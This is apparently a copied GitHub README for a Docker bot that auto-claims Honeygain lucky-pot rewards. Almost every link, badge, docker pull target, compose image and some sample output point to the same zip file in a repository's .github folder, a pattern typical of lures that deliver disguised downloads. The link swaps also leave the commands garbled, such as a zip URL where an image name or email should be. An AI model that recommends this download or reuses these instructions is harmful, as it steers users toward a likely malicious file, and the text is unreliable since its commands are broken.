<h1 align="center">
Honeygain Pot 🐝🍯
</h1>

<div align="center">

[![Static Badge](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
[![Static Badge](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
![GitHub https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip dynamic](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip%20Tag&color=red)
[![Docker Stars](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip%20Stars)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
[![GitHub Repo stars](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
[![Donate](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)

If you like this project, don't forget to leave a star. ⭐

### Containerized Docker image for [Honeygain](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) lucky pot 🍯

>**Note:** This built image comes with no warranty of any kind. By using this image you agree this License Agreement in addition with Honeygain's T&C.

This is a simple Docker image for running Honeygain's lucky pot auto-claim bot.

</div>

## Pulling Image 🐳
**64-Bit Platform:** `linux/amd64` `linux/arm64`
```sh
docker pull https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
```

**32-Bit Platform:** `linux/arm/v7`
```sh
docker pull https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
```

## Overview 🐝
[**Honeygain-Pot**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) 🍯 is a very lightweight bot powered by Bun JavaScript runtime to automatically claim your lucky pot bonus daily from [**Honeygain**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)🐝.

The bot is designed to be run in a docker environment, allowing it to be deployed alongside the Honeygain docker container.

Very minimal resources, resulting in CPU utilisation staying at idle **0%** the entire time.
```
NAME            CPU %     MEM USAGE / LIMIT   MEM %     NET I/O         BLOCK I/O
honeygain-pot   0.00%     592KiB / 320MiB     0.17%     3.3MB / 206kB   0B / 43.6MB
```

### Image Variants 📦
| Variant                   | Image Size | Platforms               |
|:--------------------------|:-----------|:------------------------|
| Honeygain Pot (IGM)       | 3.98MB     | amd64, arm64, armv7     |
| Honeygain Pot (Standard)  | 153MB      | amd64, arm64            |
| Honeygain Pot (arm32v7)   | 209MB      | armv7                   |  

The super-lightweight optimised version is licensed exclusively for use with Income Generator (IGM).

[**Income Generator**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) (IGM) comes pre-configured with a significantly faster, super-lightweight version, including automatic updates. It orchestrates multiple passive income sources with proxy support to maximise earnings and is highly recommended for use.

## Features 🚀
- Automatically log in and claim daily lucky pot.
- Caching to avoid unnecessary logins for faster execution.
- Find out the remaining time before the next claim.
- Set up the timer and auto-wait for the duration.
- On ready to reclaim, repeat the cycle.
- If an error occurs, will cool down and re-attempt.
- Works with `Honeygain` and `JumpTask` mode.

### Output 🖥️
This is what the script looks like when you inspect the output.
```
------------ Honeygain Pot Auto Claim ------------
Logging in as https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
Logged into Honeygain 🐝
--------------------------------------------------

Active Devices: 5 💻

Earning with JumpTask wallet 💰
Claimed 100 credits ✅
Won today 10 credits 🤑
Gathered 2.53 GB today 💻
Earned today 157.43 credits 🍯
JumpTask bonus 7.58 🍯

Waiting for next available pot to claim 🍯
Ready to claim in 7 hours 40 minutes ⏱️

Current logged time: 16:19:26
Next event trigger:  00:00:00

Ready to claim again ✅
```

## Usage 📃
Define the following environment variable to bootstrap the image.

| Variable | Description | Mandatory |
| :--- | :--- | :---: |
| **EMAIL**     | Your Honeygain email address    | YES |
| **PASSWORD**  | Your Honeygain password         | YES |

Or supply credentials in a Dotenv `.env` file.
```markdown
EMAIL=<email_address>
PASSWORD=<password_credential>
```

## Docker Deployment 🐳
### Compose
File: `https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip`
```yaml
services:
  honeygain-pot:
    container_name: honeygain-pot
    image: https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
    restart: unless-stopped
    environment:
      - EMAIL=$EMAIL
      - PASSWORD=$PASSWORD
    dns:
      - 1.1.1.1
      - 8.8.8.8
```

With Honeygain app docker image.
```yaml
services:
  honeygain:
    container_name: honeygain
    image: honeygain/honeygain
    restart: always
    command: -tou-accept -email $EMAIL -pass $PASSWORD -device $<name_to_identify_device>
    dns:
      - 1.1.1.1
      - 8.8.8.8

  honeygain-pot:
    container_name: honeygain-pot
    image: xterna/honeygain-pot
    restart: unless-stopped
    environment:
      - EMAIL=$EMAIL
      - PASSWORD=$PASSWORD
    dns:
      - 1.1.1.1
      - 8.8.8.8
    depends_on:
      - honeygain
```

Execute where compose file is located.
```yaml
docker compose up -d
```

### CLI
Using environment variable or Dotenv `.env` defined e.g.
```sh
docker run -d --restart unless-stopped --name honeygain-pot -e EMAIL=$HONEYGAIN_EMAIL -e PASSWORD=$HONEYGAIN_PASSWORD https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
```

Directly passing credentials.
```sh
docker run -d --restart unless-stopped --name honeygain-pot -e https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip -e PASSWORD=pass123 https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
```
This will start the application in the background. The alias assigned is `honeygain-pot`.

## Like My Work? 🫶
Donations are warmly welcomed no matter how small and thank you very much. 😌
- **Bitcoin (BTC)** - `bc1qq993w3mxsf5aph5c362wjv3zaegk37tcvw7rl4`
- **Ethereum (ETH)** - `0x2601B9940F9594810DEDC44015491f0f9D6Dd1cA`
- **Binance Smart Chain (BSC)** - `0x2601B9940F9594810DEDC44015491f0f9D6Dd1cA`
- **Solana (SOL)** - `Ap5aiAbnsLtR2XVJB3sp37qdNP5VfqydAgUThvdEiL5i`
- **PayPal** - [@xterna](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)

## Disclaimer ⚠️
Disclaimer: This image is neither affiliated with nor endorsed by Honeygain. Use this image at your own risk and responsibility. By using this image, you agree to be automatically bound by the License Agreement associated with it.

The author does not provide any assurances, whether explicit or implicit, regarding the accuracy, completeness, or appropriateness of this image for specific purposes. The author shall not be held accountable for any damages, including but not limited to direct, indirect, incidental, consequential, or special damages, arising from the use or inability to use this image or its accompanying documentation, even if the possibility of such damages has been communicated.

By choosing to use this image, you acknowledge and assume all risks associated with its use. Additionally, you agree that the author cannot be held liable for any issues or consequences that may arise as a result of its usage.
